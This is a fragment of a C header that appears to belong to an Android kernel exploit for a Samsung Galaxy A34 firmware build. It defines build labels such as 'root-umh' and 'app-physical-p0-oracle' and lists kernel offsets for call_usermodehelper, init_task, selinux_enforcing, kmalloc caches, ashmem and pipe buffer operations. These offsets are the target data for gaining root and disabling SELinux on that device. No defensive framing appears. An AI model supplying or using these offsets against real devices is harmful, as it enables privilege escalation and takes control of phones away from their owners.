...
#define BUILD_VARIANT_LABEL "a34x-A346EXXSDEZB6-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "a34x-A346EXXSDEZB6-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a34xdxx/a34x:16/BP2A.250605.031.A3/A346EXXSDEZB6:user/release-keys"
#endif
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00150460ULL
...
#define P0_FINGERPRINT_HEADER \
  "targets/a34x-A346EXXSDEZB6/p0_fingerprint.h"
#endif
...
/* A346EXXSDEZB6 offsets. */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00a32818ULL
#define NOOP_LLSEEK_OFF 0x010458b8ULL
#define COPY_SPLICE_READ_OFF 0x0021c198ULL
#define CONFIGFS_READ_ITER_OFF 0x00a7dab4ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00a7dfe0ULL
#define ASHMEM_IOCTL_OFF 0x003bc5d8ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x01077128ULL
#define ASHMEM_MMAP_OFF 0x003bcd68ULL
#define ASHMEM_OPEN_OFF 0x003bcf98ULL
#define ASHMEM_RELEASE_OFF 0x003bd020ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x003bd0acULL
#define ANON_PIPE_BUF_OPS_OFF 0x0123a948ULL
#define ASHMEM_FOPS_OFF 0x013c2c70ULL
#define KMALLOC_CACHES_OFF 0x017944f0ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x022cae60ULL
#define INIT_TASK_OFF 0x022de340ULL
#define ROOT_TASK_GROUP_OFF 0x024d8d80ULL
#define SELINUX_ENFORCING_OFF 0x0251b4b8ULL
#define SYSCTL_BOOTID_OFF 0x025bd070ULL
#define ASHMEM_MISC_OFF 0x0243d860ULL
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017216f0ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x022d2278ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x023fa7e0ULL
